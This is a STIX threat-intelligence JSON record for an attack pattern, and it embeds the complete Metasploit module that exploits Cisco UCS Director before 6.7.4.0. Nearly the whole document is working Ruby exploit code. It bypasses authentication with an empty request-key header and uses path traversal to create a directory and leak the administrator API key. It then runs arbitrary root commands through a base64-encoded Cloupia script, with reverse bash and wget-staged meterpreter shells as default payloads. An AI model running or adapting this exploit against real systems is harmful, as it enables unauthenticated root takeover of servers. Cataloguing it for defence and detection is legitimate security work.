{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5496cfaa-4370-49ae-9f8a-a9c3ddea8893",
    "created": "2024-08-14T17:01:30.358529Z",
    "modified": "2024-08-14T17:01:30.358533Z",
    "name": "Cisco UCS Director Cloupia Script RCE",
    "description": " This module exploits an authentication bypass and directory traversals in Cisco UCS Director < 6.7.4.0 to leak the administrator's REST API key and execute a Cloupia script containing an arbitrary root command.  Note that the primary functionality of this module is to leverage the Cloupia script interpreter to execute code. This functionality is part of the application's intended operation and considered a \"foreverday.\" The authentication bypass and directory traversals only get us there.  If you already have an API key, you may set it in the API_KEY option. The LEAK_FILE option may be set if you wish to leak the API key from a different absolute path, but normally this isn't advisable.  Tested on Cisco's VMware distribution of 6.7.3.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_ucs_cloupia_script_rce.rb",
            "external_id": "cisco_ucs_cloupia_script_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2020/04/17/strike-three-symlinking-your-way-to-unauthenticated-access-against-cisco-ucs-director.html"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/src-2020-0014.py.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco UCS Director Cloupia Script RCE',\n        'Description' => %q{\n          This module exploits an authentication bypass and directory traversals\n          in Cisco UCS Director < 6.7.4.0 to leak the administrator's REST API\n          key and execute a Cloupia script containing an arbitrary root command.\n\n          Note that the primary functionality of this module is to leverage the\n          Cloupia script interpreter to execute code. This functionality is part\n          of the application's intended operation and considered a \"foreverday.\"\n          The authentication bypass and directory traversals only get us there.\n\n          If you already have an API key, you may set it in the API_KEY option.\n          The LEAK_FILE option may be set if you wish to leak the API key from a\n          different absolute path, but normally this isn't advisable.\n\n          Tested on Cisco's VMware distribution of 6.7.3.0.\n        },\n        'Author' => [\n          'mr_me', # Discovery and exploit\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-3243'], # X-Cloupia-Request-Key auth bypass\n          ['CVE', '2020-3250'], # Directory traversal #2 (userAPIDownloadFile)\n          ['ZDI', '20-540'], # X-Cloupia-Request-Key auth bypass\n          ['ZDI', '20-538'], # Directory traversal #2 (userAPIDownloadFile)\n          ['URL', 'https://srcincite.io/blog/2020/04/17/strike-three-symlinking-your-way-to-unauthenticated-access-against-cisco-ucs-director.html'],\n          ['URL', 'https://srcincite.io/pocs/src-2020-0014.py.txt']\n        ],\n        'DisclosureDate' => '2020-04-15', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => 'wget',\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('API_KEY', [false, 'API key if you have it']),\n      OptString.new(\n        'LEAK_FILE',\n        [\n          true,\n          'Leak API key from this file (absolute path)',\n          '/opt/infra/idaccessmgr/logfile.txt',\n          nil, # enums\n          %r{^/.+$} # LEAK_FILE must be an absolute path\n        ]\n      )\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/app/ui/login.jsp')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && res.body.include?('Cisco UCS Director')\n      return CheckCode::Unknown('Target is not running Cisco UCS Director.')\n    end\n\n    CheckCode::Detected('Target is running Cisco UCS Director.')\n  end\n\n  def exploit\n    # Randomly named file is never written to the exports directory\n    create_exports_dir(\n      '/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports',\n      rand_text_alphanumeric(8..42)\n    )\n\n    if (@api_key = datastore['API_KEY'])\n      print_status(\"User-specified API key: #{@api_key}\")\n    else\n      leak_api_key(datastore['LEAK_FILE'])\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def create_exports_dir(*path_parts)\n    path = normalize_uri(path_parts)\n\n    mime = Rex::MIME::Message.new\n    mime.add_part(\n      Faker::Hacker.say_something_smart, # data\n      'text/plain', # content_type\n      nil, # transfer_encoding\n      %(form-data; name=\"#{rand_text_alphanumeric(8..42)}\"; ) +\n        # Directory traversal #1:\n        #   /opt/infra/uploads/ApiUploads/../../../../foo/bar -> /foo/bar\n        %(filename=\"../../../..#{path}\") # content_disposition\n    )\n\n    print_status('Creating exports directory')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cloupia/api/rest'),\n      'headers' => {\n        'X-Cloupia-Request-Key' => '' # Auth bypass\n      },\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'vars_get' => {\n        'opName' => 'userAPI:userAPIUnifiedImport',\n        'opData' => '{}'\n      },\n      'data' => mime.to_s\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    # It will always return 200, even on error\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Target returned #{res.code} code\")\n    end\n\n    # It will always return this error, despite creating the directory!\n    unless res.body.include?('Cannot execute operation')\n      fail_with(Failure::NotVulnerable, 'Could not create exports directory')\n    end\n\n    print_good('Successfully created exports directory')\n  end\n\n  def leak_api_key(*path_parts)\n    path = normalize_uri(path_parts)\n\n    print_status(\"Leaking API key from #{path}\")\n\n    # TODO: Chunk this!\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/cloupia/api/rest'),\n      'headers' => {\n        'X-Cloupia-Request-Key' => '' # Auth bypass\n      },\n      'vars_get' => {\n        'opName' => 'userAPI:userAPIDownloadFile',\n        'opData' => {\n          # Directory traversal #2:\n          #   /opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/../../../../../../../../foo/bar -> /foo/bar\n          'param0' => \"../../../../../../../..#{path}\"\n        }.to_json\n      },\n      'partial' => true\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    # It will always return 200, even on error\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Target returned #{res.code} code\")\n    end\n\n    # There is no spoon\n    if res.body.include?('There is no file with the name')\n      fail_with(Failure::NotFound, \"#{path} does not exist\")\n    end\n\n    # An empty body may indicate permission denied\n    if res.body.empty?\n      fail_with(Failure::UnexpectedReply, \"#{path} is empty or unreadable\")\n    end\n\n    vprint_good(\"Successfully dumped #{path}\")\n\n    @api_key =\n      res.body.scan(/\"loginName\":\"admin\".+\"restKey\":\"(\\h+)\"/).flatten.first\n\n    unless @api_key\n      fail_with(Failure::NoAccess, 'Could not find API key')\n    end\n\n    print_good(\"Found API key: #{@api_key}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cloupia/api-v2/generalActions'),\n      'headers' => {\n        'X-Cloupia-Request-Key' => @api_key\n      },\n      'ctype' => 'text/xml',\n      'data' => cloupia_script(cmd)\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    # It will always return 200, even on error\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Target returned #{res.code} code\")\n    end\n\n    # Just like Unix, a status of 0 indicates success\n    unless res.body.include?('<operationStatus>0</operationStatus')\n      fail_with(Failure::PayloadFailed, \"Could not execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def cloupia_script(cmd)\n    # https://docs.oracle.com/javase/8/docs/api/java/util/Base64.Decoder.html\n    script = <<~JAVA.tr(\"\\n\", '')\n      new java.lang.ProcessBuilder(\n        \"bash\",\n        \"-c\",\n        new java.lang.String(\n          java.util.Base64.getDecoder().decode(\n            \"#{Rex::Text.encode_base64(cmd)}\"\n          )\n        )\n      ).start();\n    JAVA\n\n    <<~XML\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <cuicOperationRequest>\n        <operationType>EXECUTE_CLOUPIA_SCRIPT</operationType>\n        <payload>\n          <![CDATA[\n            <ExecuteCloupiaScript>\n              <label>#{rand_text_alphanumeric(8..42)}</label>\n              <script>#{script.encode(xml: :text)}</script>\n            </ExecuteCloupiaScript>\n          ]]>\n        </payload>\n      </cuicOperationRequest>\n    XML\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-15, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}